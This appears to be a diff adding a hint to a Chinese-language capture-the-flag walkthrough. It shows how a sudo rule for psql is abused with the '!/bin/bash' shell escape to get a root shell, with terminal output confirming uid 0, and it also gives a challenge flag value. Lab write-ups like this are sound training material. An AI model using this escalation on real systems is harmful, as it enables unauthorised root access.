@@ -624,5 +624,49 @@ psql
 flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}
 ```
 
+hint
 
+```bash
+默认情况下sudo /usr/local/postgresql/bin/psql执行默认是以root身份启动psql进程然后使用root账户登录PostgreSQL，所以会要求输入root密码。这样显式指定以postgres身份登录数据库即可  
+postgres@web04:/home$ sudo -u root /usr/local/postgresql/bin/psql -U postgres  
+Password for user postgres:  
+Welcome to psql 8.1.0, the PostgreSQL interactive terminal.
+
+Type: \copyright for distribution terms  
+\h for help with SQL commands  
+? for help with psql commands  
+\g or terminate with semicolon to execute query  
+\q to quit
+
+postgres=# ?  
+General  
+\c[onnect] [DBNAME|- [USER]]  
+connect to new database (currently "postgres")  
+\cd [DIR] change the current working directory  
+\copyright show PostgreSQL usage and distribution terms  
+\encoding [ENCODING]  
+show or set client encoding  
+\h [NAME] help on syntax of SQL commands, * for all commands  
+\q quit psql  
+\set [NAME [VALUE]]  
+set internal variable, or list all if no parameters  
+\timing toggle timing of commands (currently off)  
+\unset NAME unset (delete) internal variable  
+! [COMMAND] execute command in shell or start interactive shell
+
+Query Buffer  
+\e [FILE] edit the query buffer (or file) with external editor  
+\g [FILE] send query buffer to server (and results to file or |pipe)  
+\p show the contents of the query buffer  
+\r reset (clear) the query buffer  
+\w FILE write query buffer to file
+
+Input/Output  
+\echo [STRING] write string to standard output  
+\i FILE execute commands from file  
+\o [FILE] send all query results to file or |pipe  
+!/bin/bash  
+root@web04:/home# id  
+uid=0(root) gid=0(root) groups=0(root)
+```
 
